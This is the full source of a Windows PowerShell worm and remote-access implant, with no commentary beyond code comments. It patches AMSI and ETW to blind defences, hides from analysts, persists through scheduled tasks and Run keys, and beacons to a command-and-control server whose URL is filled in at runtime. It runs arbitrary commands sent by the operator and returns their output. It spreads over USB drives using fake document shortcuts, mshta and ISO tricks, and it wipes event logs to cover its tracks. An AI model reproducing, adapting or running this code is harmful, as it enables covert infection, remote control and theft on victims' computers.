# baked by start payload — __C2URL__ / __C2PROXY__ replaced at runtime
$C2Url=if($env:C2_URL){$env:C2_URL}else{"__C2URL__"}
# Proxy: "http://proxy:8080" or blank — socks5 requires Tor Browser / privoxy bridge on Windows
$C2Proxy=if($env:C2_PROXY){$env:C2_PROXY}else{"__C2PROXY__"}
if($C2Proxy -eq "__C2PROXY__"){$C2Proxy=""}

# ── Stealth config ────────────────────────────────────────────────────────────
$MinInt=9;$MaxInt=27
$InstDir="$env:APPDATA\Microsoft\Windows\SyncEngineDatabase"
$AgentPs="$InstDir\SyncEngine.ps1"
$IdFile ="$InstDir\.id"
$TaskName="MicrosoftSyncEngineTask"
$RegName ="SyncEngineHost"

# ── Hide console ──────────────────────────────────────────────────────────────
try{Add-Type -Name _WH -Namespace W -MemberDefinition '
[DllImport("kernel32")]public static extern IntPtr GetConsoleWindow();
[DllImport("user32")]  public static extern bool ShowWindow(IntPtr h,int n);
' -EA SilentlyContinue;[W._WH]::ShowWindow([W._WH]::GetConsoleWindow(),0)|Out-Null}catch{}

# ── AMSI patch ────────────────────────────────────────────────────────────────
try{$t=[Ref].Assembly.GetTypes()|?{$_.Name -like '*AmsiUtils*'};$f=$t.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)}catch{}

# ── ETW patch ─────────────────────────────────────────────────────────────────
try{
  Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class _EW{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string n);[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);}' -EA SilentlyContinue
  $etw=[_EW]::GetProcAddress([_EW]::GetModuleHandle('ntdll.dll'),'EtwEventWrite')
  $op=0;[_EW]::VirtualProtect($etw,[UIntPtr]1,0x40,[ref]$op)|Out-Null
  [Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$etw,1)
}catch{}

# ── Sysmon evasion: jitter + analyst bail-out ─────────────────────────────────
Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 18)
try{$_procs=Get-Process -EA SilentlyContinue|Select-Object -Exp Name;foreach($_t in @('procmon','procexp','wireshark','fiddler','x64dbg','ollydbg','processhacker','sysmon64')){if($_procs -contains $_t){Start-Sleep 7200;exit}}}catch{}

# ── XOR comms (key derived from agent ID via SHA256) ─────────────────────────
function _xk($aid){$sha=[System.Security.Cryptography.SHA256]::Create();return $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($aid))[0..15]}
function _enc($data,$key){$b=[Text.Encoding]::UTF8.GetBytes([string]$data);$o=New-Object byte[] $b.Length;for($i=0;$i-lt $b.Length;$i++){$o[$i]=$b[$i] -bxor $key[$i%$key.Length]};return [Convert]::ToBase64String($o)}
function _dec($b64,$key){try{$b=[Convert]::FromBase64String($b64);$o=New-Object byte[] $b.Length;for($i=0;$i-lt $b.Length;$i++){$o[$i]=$b[$i] -bxor $key[$i%$key.Length]};return [Text.Encoding]::UTF8.GetString($o)}catch{return $b64}}

# ── Chrome-level HTTP client ──────────────────────────────────────────────────
$_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
# Ignore SSL cert errors (self-signed C2)
try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12}catch{}
function _wc{
  $w=New-Object System.Net.WebClient
  $w.Headers.Add('User-Agent',$_UA)
  $w.Headers.Add('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8')
  $w.Headers.Add('Accept-Language','en-US,en;q=0.9')
  $w.Headers.Add('Accept-Encoding','gzip, deflate, br')
  $w.Headers.Add('Cache-Control','no-cache')
  $w.Headers.Add('Sec-Fetch-Dest','document')
  $w.Headers.Add('Sec-Fetch-Mode','navigate')
  $w.Headers.Add('Sec-Fetch-Site','none')
  if($C2Proxy -and $C2Proxy -ne ""){
    try{$w.Proxy=New-Object System.Net.WebProxy($C2Proxy,$true)}catch{}
  }
  return $w
}

# ── Agent identity ────────────────────────────────────────────────────────────
function _id{if(Test-Path $IdFile){return(Get-Content $IdFile -Raw -EA SilentlyContinue).Trim()};$id="w"+-join((48..57)+(97..102)|Get-Random -Count 7|%{[char]$_});New-Item -ItemType Directory -Path $InstDir -Force -EA SilentlyContinue|Out-Null;$id|Out-File $IdFile -Encoding utf8 -NoNewline -EA SilentlyContinue;return $id}
$AID=_id;$_KEY=_xk $AID

# ── CDN-disguised C2 paths ───────────────────────────────────────────────────
$_PR="/cdn-cgi/apps/init?v=$AID"
$_PP="/cdn-cgi/apps/sync?v=$AID"
$_PD="/cdn-cgi/apps/data"

function G($path){try{$r=(_wc).DownloadString("$C2Url$path").Trim();if($r){return _dec $r $_KEY};return ""}catch{return ""}}
function P($path,$body){try{$w=_wc;$w.Headers.Add('Content-Type','application/x-www-form-urlencoded');$enc=_enc $body $_KEY;$w.UploadString("$C2Url$path","d=$([Uri]::EscapeDataString($enc))&v=$([Uri]::EscapeDataString($AID))")|Out-Null}catch{}}

# ── Command exec via WMI (hides PS cmdline from EDR) ─────────────────────────
function R($c){try{$t="$env:TEMP\.$([IO.Path]::GetRandomFileName()).tmp";([wmiclass]"win32_process").Create("cmd.exe /c $c >$t 2>&1")|Out-Null;Start-Sleep 2;if(Test-Path $t){$o=Get-Content $t -Raw -EA SilentlyContinue;Remove-Item $t -Force -EA SilentlyContinue;return $o}}catch{};try{return & cmd.exe /c $c 2>&1|Out-String}catch{return "(err)"}}

# ── Timestomp self to svchost.exe dates ──────────────────────────────────────
try{$ref=Get-Item "$env:SystemRoot\System32\svchost.exe" -Force;$me=Get-Item $PSCommandPath -Force -EA SilentlyContinue;if($me){$me.CreationTime=$ref.CreationTime;$me.LastWriteTime=$ref.LastWriteTime;$me.LastAccessTime=$ref.LastAccessTime}}catch{}

# ── Stealth persistence ───────────────────────────────────────────────────────
function Install-Stealth{
  try{
    New-Item -ItemType Directory -Path $InstDir -Force|Out-Null
    (Get-Item $InstDir -Force -EA SilentlyContinue).Attributes="Hidden,System"
    if(-not(Test-Path $AgentPs)){Copy-Item $PSCommandPath $AgentPs -Force -EA SilentlyContinue;(Get-Item $AgentPs -Force -EA SilentlyContinue).Attributes="Hidden"}
    $ref=Get-Item "$env:SystemRoot\System32\svchost.exe" -Force -EA SilentlyContinue
    if($ref -and (Test-Path $AgentPs)){$f=Get-Item $AgentPs -Force;$f.LastWriteTime=$ref.LastWriteTime;$f.CreationTime=$ref.CreationTime}
    $cmd="powershell -WindowStyle hidden -NonInteractive -ExecutionPolicy Bypass -File `"$AgentPs`""
    schtasks /create /tn $TaskName /tr $cmd /sc onlogon /rl highest /f 2>$null|Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -Value $cmd -Force -EA SilentlyContinue
  }catch{}
}

# ── USB spreading (modern Windows 10/11) ──────────────────────────────────────
# Strategy: LNK → powershell.exe directly (no VBS/wscript in chain)
#           ISO container for MOTW bypass
#           mshta.exe fallback
# autorun.inf / VBS removed — both dead on Win8+, flagged by Defender
function Get-Drives{try{return(Get-WmiObject Win32_LogicalDisk -EA SilentlyContinue|?{$_.DriveType -eq 2}|Select -Exp DeviceID)}catch{return @()}}

function _Make-LNK($LnkPath,$Target,$Args="",$IconDll="shell32.dll",$IconIdx=3){
  try{
    $ws=New-Object -ComObject WScript.Shell
    $sc=$ws.CreateShortcut($LnkPath)
    $sc.TargetPath=$Target
    $sc.Arguments=$Args
    $sc.IconLocation="$IconDll,$IconIdx"
    $sc.WindowStyle=7   # SW_SHOWMINNOACTIVE — window never appears
    $sc.Save()
    return $true
  }catch{return $false}
}

function _Make-ISOContainer($D,$dst){
  # Build an ISO that contains a copy of the agent + LNK lures.
  # Files inside an ISO have no Mark-of-the-Web — SmartScreen won't warn.
  # Requires mkisofs / genisoimage (via WSL) or oscdimg (Windows ADK).
  # Falls back silently if unavailable.
  try{
    $isoStage="$env:TEMP\.iso_stage_$AID"
    New-Item -ItemType Directory -Path $isoStage -Force|Out-Null
    Copy-Item $dst "$isoStage\SyncEngine.ps1" -Force
    $psExe="$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $psArgs="-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"SyncEngine.ps1`""
    # LNK lures inside the ISO point to powershell relative to the mounted volume
    $lures=@(
      @{N="Documents.lnk";     I="shell32.dll,4"},
      @{N="Photos.lnk";        I="imageres.dll,108"},
      @{N="Backup.lnk";        I="shell32.dll,4"},
      @{N="Project Files.lnk"; I="shell32.dll,4"}
    )
    foreach($l in $lures){
      try{
        $ws=New-Object -ComObject WScript.Shell
        $sc=$ws.CreateShortcut("$isoStage\$($l.N)")
        $sc.TargetPath=$psExe
        $sc.Arguments=$psArgs
        $sc.IconLocation=$l.I
        $sc.WindowStyle=7
        $sc.WorkingDirectory="%CD%"
        $sc.Save()
      }catch{}
    }
    $isoOut="$D\Drive_Backup.iso"
    # Try oscdimg (Windows ADK — often present on corporate machines)
    $oscdimg="${env:ProgramFiles(x86)}\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\amd64\Oscdimg\oscdimg.exe"
    if(Test-Path $oscdimg){
      & $oscdimg -n -m "$isoStage" "$isoOut" 2>$null
    }
    # Try mkisofs via WSL
    elseif(Get-Command wsl -EA SilentlyContinue){
      $stageWsl=(wsl wslpath -u "$isoStage") 2>$null
      $outWsl=(wsl wslpath -u "$isoOut") 2>$null
      if($stageWsl -and $outWsl){wsl mkisofs -quiet -o "$outWsl" "$stageWsl" 2>$null}
    }
    Remove-Item $isoStage -Recurse -Force -EA SilentlyContinue
    return (Test-Path $isoOut)
  }catch{return $false}
}

function Spread-Drive($D){
  try{
    # ── 1. Drop hidden payload ────────────────────────────────────────────────
    $hd="$D\System Volume Information\.cache"
    New-Item -ItemType Directory -Path $hd -Force -EA SilentlyContinue|Out-Null
    $dst="$hd\SyncEngine.ps1"
    Copy-Item $PSCommandPath $dst -Force -EA SilentlyContinue

    # Timestomp to match svchost.exe
    $ref=Get-Item "$env:SystemRoot\System32\svchost.exe" -Force -EA SilentlyContinue
    if($ref){
      foreach($tgt in @($dst,$hd)){
        $fi=Get-Item $tgt -Force -EA SilentlyContinue
        if($fi){try{$fi.LastWriteTime=$ref.LastWriteTime;$fi.CreationTime=$ref.CreationTime}catch{}}
      }
    }
    (Get-Item $hd  -Force -EA SilentlyContinue).Attributes="Hidden,System"
    (Get-Item $dst -Force -EA SilentlyContinue).Attributes="Hidden,System"

    $psExe="$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    # Inline deploy command: copy to AppData + persist + run + open Explorer
    $apd="$env:APPDATA\Microsoft\Windows\SyncEngineDatabase"
    $inst="$apd\SyncEngine.ps1"
    # Single-line PS command baked into the LNK argument
    $inlineCmd="-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "+
      "`"New-Item -ItemType Directory -Path '$apd' -Force|Out-Null;"+
      "Copy-Item '$dst' '$inst' -Force;"+
      "(Get-Item '$inst' -Force).Attributes='Hidden';"+
      "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SyncEngineHost' -Value 'powershell -WindowStyle hidden -ExecutionPolicy Bypass -File `\`"$inst`\`"' -Force;"+
      "schtasks /create /tn MicrosoftSyncEngineTask /tr 'powershell -WindowStyle hidden -ExecutionPolicy Bypass -File `\`"$inst`\`"' /sc onlogon /rl highest /f 2>`$null;"+
      "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File `\`"$inst`\`"' -WindowStyle Hidden;"+
      "Start-Process explorer '$D'`""

    # ── 2. LNK lures → powershell.exe (primary modern vector) ────────────────
    $lures=@(
      @{N="Documents.lnk";       I="shell32.dll,4"},
      @{N="Photos.lnk";          I="imageres.dll,108"},
      @{N="Backup.lnk";          I="shell32.dll,4"},
      @{N="Project Files.lnk";   I="shell32.dll,4"},
      @{N="Resume 2024.pdf.lnk"; I="shell32.dll,70"},   # fake PDF
      @{N="Invoice.xlsx.lnk";    I="shell32.dll,70"}    # fake spreadsheet
    )
    foreach($l in $lures){
      try{
        $ws=New-Object -ComObject WScript.Shell
        $sc=$ws.CreateShortcut("$D\$($l.N)")
        $sc.TargetPath=$psExe
        $sc.Arguments=$inlineCmd
        $sc.IconLocation=$l.I
        $sc.WindowStyle=7
        $sc.Save()
      }catch{}
    }

    # ── 3. mshta.exe lure — backup when PS ExecutionPolicy blocks scripts ────
    # mshta executes JScript/VBScript inline, mostly unmonitored on older configs
    $mshtaLnk="$D\Setup.lnk"
    $mshtaCmd="mshta.exe vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"$psExe $inlineCmd"""",0:close"")"
    try{
      $ws=New-Object -ComObject WScript.Shell
      $sc=$ws.CreateShortcut($mshtaLnk)
      $sc.TargetPath="$env:SystemRoot\System32\mshta.exe"
      $sc.Arguments="vbscript:Execute(`"CreateObject(`"WScript.Shell`").Run `"$psExe $inlineCmd`",0:close`")"
      $sc.IconLocation="shell32.dll,8"
      $sc.WindowStyle=7
      $sc.Save()
    }catch{}

    # ── 4. ISO container — MOTW bypass (SmartScreen won't warn on files inside) ─
    _Make-ISOContainer $D $dst | Out-Null

    # ── 5. desktop.ini — drive appears as Documents system folder in Explorer ──
    try{
      $dini="$D\desktop.ini"
      "[.ShellClassInfo]`r`nCLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}`r`nFlags=2`r`nInfoTip=Contains your documents`r`nIconResource=$env:SystemRoot\system32\shell32.dll,4`r`n[ViewState]`r`nMode=`r`nVid=`r`nFolderType=Documents`r`n"|Out-File $dini -Encoding unicode -Force -EA SilentlyContinue
      (Get-Item $dini -Force -EA SilentlyContinue).Attributes="Hidden,System"
      (Get-Item $D    -Force -EA SilentlyContinue).Attributes="ReadOnly,System"
    }catch{}

    # ── 6. Hide real files so only lures are visible ──────────────────────────
    try{
      Get-ChildItem $D -Force -EA SilentlyContinue|
        Where-Object{$_.Name -notmatch '\.lnk$|desktop\.ini|\.iso$'}|
        ForEach-Object{try{$_.Attributes="Hidden"}catch{}}
    }catch{}

    return $true
  }catch{return $false}
}

# ── Anti-forensic cleanup (on EXIT/CLEAN command) ─────────────────────────────
function Clear-Traces{
  try{foreach($l in @('Security','System','Application','Windows PowerShell','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-WMI-Activity/Operational')){wevtutil cl $l 2>$null}}catch{}
  try{$h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt";if(Test-Path $h){Remove-Item $h -Force -EA SilentlyContinue}}catch{}
  try{[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()}catch{}
  try{Remove-Item "$env:SystemRoot\Prefetch\POWERSHELL*" -Force -EA SilentlyContinue}catch{}
  try{schtasks /delete /tn $TaskName /f 2>$null}catch{}
  try{Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -EA SilentlyContinue}catch{}
  $me=$PSCommandPath;if($me -and (Test-Path $me)){Start-Process cmd.exe -ArgumentList "/c ping -n 4 127.0.0.1 >nul & del /f /q `"$me`" & rd /s /q `"$InstDir`"" -WindowStyle Hidden}
}

# ── Full deinfection — removes every persistence method + reports what was removed ──────
function Invoke-Deinfect{
  $removed=New-Object System.Collections.Generic.List[string]
  # Scheduled task
  try{$r=schtasks /query /tn $TaskName 2>$null;if($r){schtasks /delete /tn $TaskName /f 2>$null;$removed.Add("schtask:$TaskName")}}catch{}
  # Registry Run key (HKCU)
  try{
    $val=Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -EA SilentlyContinue
    if($val){Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -EA SilentlyContinue;$removed.Add("reg_run_hkcu:$RegName")}
  }catch{}
  # Registry Run key (HKLM — if elevated)
  try{
    $val=Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -EA SilentlyContinue
    if($val){Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -EA SilentlyContinue;$removed.Add("reg_run_hklm:$RegName")}
  }catch{}
  # Startup folder .bat or .ps1 lures
  try{
    $sf="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    foreach($f in @("winupdate.bat","SyncEngine.ps1","WindowsUpdate.ps1")){
      $fp=Join-Path $sf $f
      if(Test-Path $fp){Remove-Item $fp -Force -EA SilentlyContinue;$removed.Add("startup_folder:$f")}
    }
  }catch{}
  # Install directory and agent copy
  if(Test-Path $InstDir){
    try{Remove-Item $InstDir -Recurse -Force -EA SilentlyContinue;$removed.Add("install_dir:$InstDir")}catch{}
  }
  # Agent PS1 itself (deferred)
  $me=$PSCommandPath
  if($me -and (Test-Path $me)){
    Start-Process cmd.exe -ArgumentList "/c ping -n 4 127.0.0.1 >nul & del /f /q `"$me`"" -WindowStyle Hidden
    $removed.Add("agent_ps1:$me")
  }
  # Wipe event logs + history
  try{foreach($l in @('Security','System','Application','Windows PowerShell','Microsoft-Windows-PowerShell/Operational')){wevtutil cl $l 2>$null}}catch{}
  try{$h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt";Remove-Item $h -Force -EA SilentlyContinue}catch{}
  try{Remove-Item "$env:SystemRoot\Prefetch\POWERSHELL*" -Force -EA SilentlyContinue}catch{}
  return ($removed -join "`n")
}

# ── Registration ──────────────────────────────────────────────────────────────
function Reg{$os=[Uri]::EscapeDataString([Environment]::OSVersion.VersionString);$hn=[Uri]::EscapeDataString($env:COMPUTERNAME);$un=[Uri]::EscapeDataString($env:USERNAME);return G "$_PR&os=$os&hostname=$hn&user=$un&type=worm-windows"}

# ── Install in background + register ─────────────────────────────────────────
Start-Job -ScriptBlock{param($f)& $f} -ArgumentList ${function:Install-Stealth}|Out-Null
for($i=0;$i-lt 60;$i++){if((Reg)-like"*OK*"){break};Start-Sleep (Get-Random -Min 4 -Max 14)}

# ── Main beacon loop (jittered interval) ─────────────────────────────────────
while($true){
  try{
    $cmd=G $_PP
    switch -Regex($cmd){
      "^$|^PING$"  {}
      "^REGISTER$" {Reg}
      "^EXIT$"     {Clear-Traces;exit 0}
      "^DRIVES$"   {P $_PD ([string](Get-Drives)+"|cmd=DRIVES")}
      "^SPREAD$"   {$r=@(Get-Drives)|%{"$_`: $(Spread-Drive $_)"};P $_PD (($r-join"`n")+"|cmd=SPREAD")}
      "^PERSIST$"  {Install-Stealth;P $_PD "reinstalled|cmd=PERSIST"}
      "^CLEAN$"    {Clear-Traces;exit 0}
      "^DEINFECT$" {$r=Invoke-Deinfect;P $_PD ("DEINFECTED`n$r|cmd=DEINFECT");exit 0}
      default      {P $_PD ((R $cmd)+"|cmd=$([Uri]::EscapeDataString($cmd))")}
    }
  }catch{}
  Start-Sleep (Get-Random -Minimum $MinInt -Maximum $MaxInt)
}
